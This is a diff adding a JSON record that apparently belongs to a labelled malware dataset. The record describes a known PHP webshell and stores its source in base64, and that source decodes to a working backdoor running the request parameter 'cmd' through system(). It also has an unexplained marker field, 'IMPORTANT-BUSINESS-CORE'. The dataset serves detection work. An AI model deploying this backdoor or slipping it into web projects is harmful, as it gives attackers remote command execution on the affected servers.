@@ -1,0 +1,10 @@
+{
+  "id": "cmd",
+  "label": "malicious",
+  "title": "Minimal $_REQUEST['cmd'] -> system() backdoor",
+  "family": "php-webshell",
+  "source": "public corpus: cmd.php (flagged by signature tools)",
+  "code_b64": "PD9waHAKaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkgKXsKZWNobyAiPHByZT4iOwokY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwpzeXN0ZW0oJGNtZCk7CmVjaG8gIjwvcHJlPiI7CmRpZTsKfQo/Pgo=",
+  "trace_id": "demo_business_core",
+  "marker": "IMPORTANT-BUSINESS-CORE"
+}
